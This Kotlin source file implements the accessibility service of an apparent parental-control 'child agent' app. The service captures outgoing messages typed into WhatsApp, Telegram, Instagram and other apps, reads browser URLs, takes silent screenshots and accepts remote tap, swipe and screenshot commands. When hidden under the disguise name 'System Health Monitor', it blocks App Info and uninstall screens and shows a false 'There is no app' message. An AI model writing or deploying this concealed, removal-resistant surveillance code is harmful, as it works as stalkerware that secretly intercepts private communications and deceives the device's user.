package com.example.xshield.childagent

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Path
import android.graphics.Bitmap
import android.os.Build
import android.util.DisplayMetrics
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.WindowManager
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Executors
import com.google.firebase.database.FirebaseDatabase

class RemoteControlAccessibilityService : AccessibilityService() {

    private val TAG = "RemoteControlService"
    private var screenWidth = 1080
    private var screenHeight = 2400

    private val controlReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val commandStr = intent?.getStringExtra("command") ?: return
            try {
                val json = JSONObject(commandStr)
                handleCommand(json)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to parse command: $commandStr", e)
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "RemoteControlAccessibilityService connected.")

        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        wm.defaultDisplay.getRealMetrics(metrics)
        screenWidth = metrics.widthPixels
        screenHeight = metrics.heightPixels

        // Pre-initialize AgentStateManager using the cached device ID if available
        val prefs = getSafeSharedPreferences()
        val deviceId = prefs.getString("device_id", "") ?: ""
        if (deviceId.isNotEmpty()) {
            AgentStateManager.initialize(this, deviceId)
        }

        val filter = IntentFilter("com.example.xshield.REMOTE_CONTROL")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(controlReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(controlReceiver, filter)
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "RemoteControlAccessibilityService interrupted.")
    }

    private var lastCapturedText: String = ""
    private var lastBroadcastedUrl: String = ""
    private var lastBroadcastTime: Long = 0L
    private var lastBlockToastTime: Long = 0L
    private var currentActivityName: String = ""
    private var lastLauncherTime: Long = 0L

    private fun isLauncherPackage(packageName: String): Boolean {
        val lower = packageName.lowercase()
        return lower.contains("launcher") || 
               lower.contains("home") || 
               lower.contains("desktop") || 
               lower.contains("shell") ||
               lower.contains("dactivity") ||
               lower.endsWith("launcher3")
    }

    private fun getSafeSharedPreferences(): android.content.SharedPreferences {
        val safeContext = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            createDeviceProtectedStorageContext()
        } else {
            this
        }
        return safeContext.getSharedPreferences("xshield_prefs", Context.MODE_PRIVATE)
    }

    private fun shouldBlockSettingsPage(
        packageName: String,
        className: String?,
        root: android.view.accessibility.AccessibilityNodeInfo
    ): Boolean {
        val isSettingsOrInstaller = packageName.contains("settings", ignoreCase = true) ||
                packageName.contains("packageinstaller", ignoreCase = true) ||
                packageName.contains("securitycenter", ignoreCase = true)

        if (!isSettingsOrInstaller) return false

        val hasPackage = root.findAccessibilityNodeInfosByText("com.example.xshield.childagent")?.isNotEmpty() == true
        val hasLabel = root.findAccessibilityNodeInfosByText("System Health Monitor")?.isNotEmpty() == true

        if (!hasPackage && !hasLabel) return false

        val clazz = className ?: ""
        val isSafeList = clazz.contains("Accessibility", ignoreCase = true) ||
                clazz.contains("Notification", ignoreCase = true) ||
                clazz.contains("Admin", ignoreCase = true) ||
                clazz.contains("Listener", ignoreCase = true) ||
                clazz.contains("ManageApplications", ignoreCase = true) ||
                clazz.contains("ManageApps", ignoreCase = true) ||
                clazz.contains("AppList", ignoreCase = true) ||
                clazz.contains("DefaultApp", ignoreCase = true) ||
                clazz.contains("SpecialAccess", ignoreCase = true) ||
                clazz.contains("UsageAccess", ignoreCase = true) ||
                clazz.contains("Overlay", ignoreCase = true) ||
                clazz.contains("WriteSettings", ignoreCase = true)

        if (isSafeList) return false

        if (packageName.contains("packageinstaller", ignoreCase = true)) {
            return true
        }

        val isAppDetailsActivity = clazz.contains("InstalledAppDetails", ignoreCase = true) ||
                clazz.contains("AppInfo", ignoreCase = true) ||
                clazz.contains("AppDetails", ignoreCase = true)

        if (isAppDetailsActivity) return true

        val hasUninstallBtn = root.findAccessibilityNodeInfosByText("Uninstall")?.isNotEmpty() == true ||
                root.findAccessibilityNodeInfosByText("Force stop")?.isNotEmpty() == true ||
                root.findAccessibilityNodeInfosByText("Disable")?.isNotEmpty() == true

        if (hasUninstallBtn) return true

        if (clazz.contains("Search", ignoreCase = true) ||
                clazz.endsWith("Settings") ||
                clazz.endsWith("HomepageActivity")
        ) {
            return false
        }

        return true
    }

    private fun getChatName(root: android.view.accessibility.AccessibilityNodeInfo?): String {
        if (root == null) return "Unknown Contact"
        
        val idsToTry = listOf(
            "com.whatsapp:id/conversation_contact_name",
            "com.whatsapp.w4b:id/conversation_contact_name",
            "org.telegram.messenger:id/title",
            "com.instagram.android:id/thread_title",
            "com.facebook.orca:id/thread_title_name"
        )
        for (id in idsToTry) {
            try {
                val nodes = root.findAccessibilityNodeInfosByViewId(id)
                if (nodes != null && nodes.isNotEmpty()) {
                    val text = nodes[0].text?.toString()
                    if (!text.isNullOrBlank()) return text
                }
            } catch (e: Exception) {
                // Ignore errors
            }
        }
        return "Unknown Contact"
    }

    private fun isValidUrlOrDomain(text: String): Boolean {
        val trimmed = text.trim()
        if (trimmed.isBlank()) return false
        
        // 1. Must contain a dot
        if (!trimmed.contains(".")) return false
        
        // 2. Must not contain spaces (spaces in the URL bar mean search query typing)
        if (trimmed.contains(" ")) return false
        
        // 3. Must not be a placeholder keyword
        val placeholderKeywords = listOf("search", "type", "buscar", "escribir", "address", "url")
        val isPlaceholder = placeholderKeywords.any { keyword -> trimmed.equals(keyword, ignoreCase = true) }
        if (isPlaceholder) return false

        // 4. Must be a valid URL pattern or domain structure
        return android.util.Patterns.WEB_URL.matcher(trimmed).matches() ||
               (trimmed.length > 4 && trimmed.substringAfterLast(".").all { it.isLetter() })
    }

    private fun extractUrl(root: android.view.accessibility.AccessibilityNodeInfo?, packageName: String): String? {
        if (root == null) return null
        
        val idsToTry = when (packageName) {
            "com.android.chrome", "com.brave.browser" -> listOf("com.android.chrome:id/url_bar", "com.brave.browser:id/url_bar")
            "com.sec.android.app.sbrowser" -> listOf("com.sec.android.app.sbrowser:id/location_bar_edit_text", "com.sec.android.app.sbrowser:id/url_bar")
            "org.mozilla.firefox" -> listOf("org.mozilla.firefox:id/url_bar_title", "org.mozilla.firefox:id/url_bar")
            "com.microsoft.emmx" -> listOf("com.microsoft.emmx:id/search_box_text", "com.microsoft.emmx:id/url_bar")
            "com.opera.browser", "com.opera.mini.native" -> listOf("com.opera.browser:id/url_field", "com.opera.mini.native:id/url_field")
            else -> emptyList()
        }

        for (id in idsToTry) {
            try {
                val nodes = root.findAccessibilityNodeInfosByViewId(id)
                if (!nodes.isNullOrEmpty()) {
                    val text = nodes[0].text?.toString()
                    if (!text.isNullOrBlank() && isValidUrlOrDomain(text)) return text
                }
            } catch (e: Exception) {
                // Ignore
            }
        }

        return findUrlByTraversal(root)
    }

    private fun findUrlByTraversal(node: android.view.accessibility.AccessibilityNodeInfo?): String? {
        if (node == null) return null
        
        val text = node.text?.toString()?.trim()
        if (!text.isNullOrBlank() && isValidUrlOrDomain(text)) {
            return text
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findUrlByTraversal(child)
            child.recycle()
            if (found != null) {
                return found
            }
        }
        return null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val packageName = event.packageName?.toString() ?: return

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val className = event.className?.toString()
            if (className != null) {
                currentActivityName = className
            }
            if (isLauncherPackage(packageName)) {
                lastLauncherTime = System.currentTimeMillis()
            }
        }

        // 1. Prevent App Info access ONLY if it came from the Home Screen Shortcut click while Hidden
        val prefs = getSafeSharedPreferences()
        val isActivated = prefs.getBoolean("activated", false)
        val isHidden = AgentStateManager.isAgentHidden()
        if (isActivated && isHidden) {
            val root = rootInActiveWindow
            if (root != null) {
                if (shouldBlockSettingsPage(packageName, currentActivityName, root)) {
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    android.widget.Toast.makeText(
                        applicationContext,
                        "There is no app. Please remove from home screen.",
                        android.widget.Toast.LENGTH_LONG
                    ).show()
                    return
                }
            }
        }

        // 0. SMS Remote Lock — blocks all app access when parent sent #XSHIELD#LOCK via SMS
        if (AgentStateManager.isSmsDeviceLocked() && !isLauncherPackage(packageName)) {
            performGlobalAction(GLOBAL_ACTION_HOME)
            val now = System.currentTimeMillis()
            if (now - lastBlockToastTime > 3000L) {
                lastBlockToastTime = now
                android.widget.Toast.makeText(
                    applicationContext,
                    "🔒 Device Locked by Parent. Contact parent to unlock.",
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
            return
        }

        // 2. Schedule Restrictions Check (Lock Device / Specific App Block schedules)
        if (checkScheduleRestriction(packageName)) {

            return
        }

        // 3. Real-time app blocking check
        if (AgentStateManager.isMonitoringEnabled() && AgentStateManager.getBlockedApps().contains(packageName)) {
            performGlobalAction(GLOBAL_ACTION_HOME)
            val now = System.currentTimeMillis()
            if (now - lastBlockToastTime > 3000L) {
                lastBlockToastTime = now
                android.widget.Toast.makeText(
                    applicationContext,
                    "Access Blocked:\nThis app is restricted by parent rules.",
                    android.widget.Toast.LENGTH_SHORT
                ).show()
            }
            return
        }

        // 2. Monitoring enabled check
        if (!AgentStateManager.isMonitoringEnabled()) return
        
        val browserPackages = setOf(
            "com.android.chrome",
            "com.sec.android.app.sbrowser",
            "org.mozilla.firefox",
            "com.opera.browser",
            "com.opera.mini.native",
            "com.microsoft.emmx",
            "com.duckduckgo.mobile.android",
            "com.brave.browser",
            "com.android.browser",
            "com.xiaomi.mibrowser"
        )
        
        if (browserPackages.contains(packageName)) {
            val url = extractUrl(rootInActiveWindow, packageName)
            if (!url.isNullOrBlank()) {
                val cleanUrl = url.trim()
                val now = System.currentTimeMillis()
                if ((cleanUrl != lastBroadcastedUrl || (now - lastBroadcastTime) > 3000L) && (now - lastBroadcastTime) > 500L) {
                    lastBroadcastedUrl = cleanUrl
                    lastBroadcastTime = now
                    
                    val broadcastIntent = Intent("com.example.xshield.BROWSER_URL_VISITED").apply {
                        setPackage(this@RemoteControlAccessibilityService.packageName)
                        putExtra("url", cleanUrl)
                        putExtra("browser", packageName)
                        putExtra("timestamp", now)
                    }
                    sendBroadcast(broadcastIntent)
                    Log.d(TAG, "Broadcasted URL: $cleanUrl from $packageName")
                }
            }
            return
        }

        val supportedPackages = setOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "com.instagram.android",
            "org.telegram.messenger",
            "com.snapchat.android",
            "com.facebook.katana",
            "com.facebook.orca",
            "com.twitter.android",
            "com.google.android.youtube"
        )
        
        if (!supportedPackages.contains(packageName)) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString(" ")
            if (text.isNotBlank()) {
                lastCapturedText = text
            }
        } else if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val className = event.className?.toString() ?: ""
            val contentDesc = event.contentDescription?.toString()?.lowercase() ?: ""
            val isSendClick = className.contains("Button", true) || 
                              className.contains("ImageView", true) || 
                              contentDesc.contains("send") || 
                              contentDesc.contains("enviar") ||
                              contentDesc.contains("message")
                              
            if (isSendClick) {
                if (lastCapturedText.isNotBlank()) {
                    val recipientName = getChatName(rootInActiveWindow)
                    val message = InstantMessage(
                        app = packageName,
                        sender = recipientName,
                        message = lastCapturedText,
                        direction = "OUTGOING",
                        timestamp = System.currentTimeMillis()
                    )
                    
                    if (NotificationMonitorService.syncManager == null) {
                        val prefs = getSafeSharedPreferences()
                        val deviceId = prefs.getString("device_id", "") ?: ""
                        if (deviceId.isNotEmpty()) {
                            NotificationMonitorService.initSyncManager(this, deviceId)
                        }
                    }
                    NotificationMonitorService.syncManager?.addMessageIfEnabled(message)
                    lastCapturedText = ""
                }
            }
        }
    }

    override fun onDestroy() {
        unregisterReceiver(controlReceiver)
        super.onDestroy()
    }

    private fun handleCommand(json: JSONObject) {
        val action = json.optString("action")
        Log.d(TAG, "Handling command: $action")
        when (action) {
            "take_screenshot" -> {
                performSilentScreenshot()
            }
            "tap" -> {
                val xRatio = json.optDouble("xRatio", 0.5)
                val yRatio = json.optDouble("yRatio", 0.5)
                performTap(xRatio.toFloat(), yRatio.toFloat())
            }
            "double_tap" -> {
                val xRatio = json.optDouble("xRatio", 0.5)
                val yRatio = json.optDouble("yRatio", 0.5)
                performDoubleTap(xRatio.toFloat(), yRatio.toFloat())
            }
            "long_press" -> {
                val xRatio = json.optDouble("xRatio", 0.5)
                val yRatio = json.optDouble("yRatio", 0.5)
                performLongPress(xRatio.toFloat(), yRatio.toFloat())
            }
            "swipe" -> {
                val startX = json.optDouble("startXRatio", 0.5).toFloat()
                val startY = json.optDouble("startYRatio", 0.5).toFloat()
                val endX = json.optDouble("endXRatio", 0.5).toFloat()
                val endY = json.optDouble("endYRatio", 0.5).toFloat()
                performSwipe(startX, startY, endX, endY)
            }
            "global_action" -> {
                val actionType = json.optString("actionType")
                performGlobalActionCommand(actionType)
            }
        }
    }

    private fun performTap(xRatio: Float, yRatio: Float) {
        val x = xRatio * screenWidth
        val y = yRatio * screenHeight
        val path = Path()
        path.moveTo(x, y)
        path.lineTo(x + 1f, y + 1f)
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
            .build()
        dispatchGesture(gesture, null, null)
    }

    private fun performDoubleTap(xRatio: Float, yRatio: Float) {
        val x = xRatio * screenWidth
        val y = yRatio * screenHeight
        val path = Path()
        path.moveTo(x, y)
        path.lineTo(x + 1f, y + 1f)
        val stroke1 = GestureDescription.StrokeDescription(path, 0, 100)
        val stroke2 = GestureDescription.StrokeDescription(path, 200, 100)
        val gesture = GestureDescription.Builder()
            .addStroke(stroke1)
            .addStroke(stroke2)
            .build()
        dispatchGesture(gesture, null, null)
    }

    private fun performLongPress(xRatio: Float, yRatio: Float) {
        val x = xRatio * screenWidth
        val y = yRatio * screenHeight
        val path = Path()
        path.moveTo(x, y)
        path.lineTo(x + 1f, y + 1f)
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 1000))
            .build()
        dispatchGesture(gesture, null, null)
    }

    private fun performSwipe(startXRatio: Float, startYRatio: Float, endXRatio: Float, endYRatio: Float) {
        val startX = startXRatio * screenWidth
        val startY = startYRatio * screenHeight
        val endX = endXRatio * screenWidth
        val endY = endYRatio * screenHeight
        val path = Path()
        path.moveTo(startX, startY)
        path.lineTo(endX, endY)
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 500))
            .build()
        dispatchGesture(gesture, null, null)
    }

    private fun performGlobalActionCommand(actionType: String) {
        val actionCode = when (actionType) {
            "HOME" -> GLOBAL_ACTION_HOME
            "BACK" -> GLOBAL_ACTION_BACK
            "RECENTS" -> GLOBAL_ACTION_RECENTS
            "NOTIFICATIONS" -> GLOBAL_ACTION_NOTIFICATIONS
            "QUICK_SETTINGS" -> GLOBAL_ACTION_QUICK_SETTINGS
            else -> return
        }
        performGlobalAction(actionCode)
    }

    private fun performSilentScreenshot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val executor = Executors.newSingleThreadExecutor()
            takeScreenshot(Display.DEFAULT_DISPLAY, executor, object : TakeScreenshotCallback {
                override fun onSuccess(screenshot: ScreenshotResult) {
                    try {
                        val bitmap = Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                        if (bitmap != null) {
                            val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
                            val out = FileOutputStream(file)
                            val softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                            softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 80, out)
                            out.flush()
                            out.close()
                            
                            val intent = Intent("com.example.xshield.SCREENSHOT_TAKEN")
                            intent.setPackage(packageName)
                            intent.putExtra("filePath", file.absolutePath)
                            sendBroadcast(intent)
                            Log.d(TAG, "Screenshot successfully saved to ${file.absolutePath} and broadcast sent")
                        } else {
                            Log.e(TAG, "HardwareBuffer to Bitmap conversion failed")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error saving screenshot", e)
                    }
                }

                override fun onFailure(errorCode: Int) {
                    Log.e(TAG, "Screenshot capture failed with code: $errorCode")
                }
            })
        } else {
            Log.e(TAG, "Screenshots require Android 11+ (API 30+)")
        }
    }

    private fun isPackageWhitelisted(packageName: String): Boolean {
        val lower = packageName.lowercase()
        // Phone / Dialer / Telecom / Contacts (allows emergency dialing)
        if (lower.contains("telephony") ||
            lower.contains("phone") ||
            lower.contains("dialer") ||
            lower.contains("telecom") ||
            lower.contains("contacts") ||
            lower == "com.android.phone" ||
            lower == "com.google.android.dialer" ||
            lower == "com.android.server.telecom"
        ) return true
        
        // System Settings & Package Installer (allows crucial system configurations)
        if (lower == "com.android.settings" || 
            lower.contains("packageinstaller") || 
            lower.contains("securitycenter")
        ) return true
        
        // System UI
        if (lower == "com.android.systemui") return true
        
        // Active Launchers
        if (isLauncherPackage(packageName)) return true
        
        // Child Agent package itself
        if (lower == "com.example.xshield.childagent") return true
        
        return false
    }

    private fun checkScheduleRestriction(packageName: String): Boolean {
        if (isPackageWhitelisted(packageName)) return false
        
        val schedulesJsonStr = AgentStateManager.getSchedulesJson()
        if (schedulesJsonStr.isBlank() || schedulesJsonStr == "[]") return false
        
        try {
            val calendar = java.util.Calendar.getInstance()
            val dayNames = listOf("", "SUN", "MON", "TUE", "WED", "THU", "FRI", "SAT")
            val currentDayOfWeek = dayNames.getOrNull(calendar.get(java.util.Calendar.DAY_OF_WEEK)) ?: ""
            val currentTimeMinutes = calendar.get(java.util.Calendar.HOUR_OF_DAY) * 60 + calendar.get(java.util.Calendar.MINUTE)
            
            val jsonArray = org.json.JSONArray(schedulesJsonStr)
            for (i in 0 until jsonArray.length()) {
                val schedule = jsonArray.getJSONObject(i)
                val isEnabled = schedule.optBoolean("isEnabled", schedule.optBoolean("enabled", true))
                if (!isEnabled) continue
                
                // Check repeat days
                val daysArr = schedule.optJSONArray("days")
                var dayMatch = false
                if (daysArr != null) {
                    for (j in 0 until daysArr.length()) {
                        if (daysArr.optString(j, "").uppercase() == currentDayOfWeek.uppercase()) {
                            dayMatch = true
                            break
                        }
                    }
                }
                if (!dayMatch) continue
                
                // Parse start and end times
                val startTime = schedule.optString("startTime", "00:00")
                val endTime = schedule.optString("endTime", "00:00")
                
                val startParts = startTime.split(":")
                val startH = startParts.getOrNull(0)?.toIntOrNull() ?: 0
                val startM = startParts.getOrNull(1)?.toIntOrNull() ?: 0
                val startTimeMinutes = startH * 60 + startM
                
                val endParts = endTime.split(":")
                val endH = endParts.getOrNull(0)?.toIntOrNull() ?: 0
                val endM = endParts.getOrNull(1)?.toIntOrNull() ?: 0
                val endTimeMinutes = endH * 60 + endM
                
                var isActive = false
                if (startTimeMinutes <= endTimeMinutes) {
                    // Daytime schedule (e.g. 09:00 - 17:00)
                    if (currentTimeMinutes >= startTimeMinutes && currentTimeMinutes < endTimeMinutes) {
                        isActive = true
                    }
                } else {
                    // Overnight schedule (e.g. 21:00 - 07:00 next day)
                    if (currentTimeMinutes >= startTimeMinutes || currentTimeMinutes < endTimeMinutes) {
                        isActive = true
                    }
                }
                
                if (isActive) {
                    val blockAll = schedule.optBoolean("blockAll", false)
                    if (blockAll) {
                        triggerScheduleBlock(true)
                        return true
                    } else {
                        // Check if specific app is blocked
                        val blockedAppsArr = schedule.optJSONArray("blockedApps")
                        if (blockedAppsArr != null) {
                            for (k in 0 until blockedAppsArr.length()) {
                                if (blockedAppsArr.optString(k, "") == packageName) {
                                    triggerScheduleBlock(false)
                                    return true
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking schedule restrictions", e)
        }
        return false
    }

    private fun triggerScheduleBlock(blockAll: Boolean) {
        performGlobalAction(GLOBAL_ACTION_HOME)
        val now = System.currentTimeMillis()
        if (now - lastBlockToastTime > 3000L) {
            lastBlockToastTime = now
            val msg = if (blockAll) {
                "Device is locked. Screen time schedule is active."
            } else {
                "Access Blocked: Restricted by schedule."
            }
            android.widget.Toast.makeText(
                applicationContext,
                msg,
                android.widget.Toast.LENGTH_LONG
            ).show()
        }
    }
}
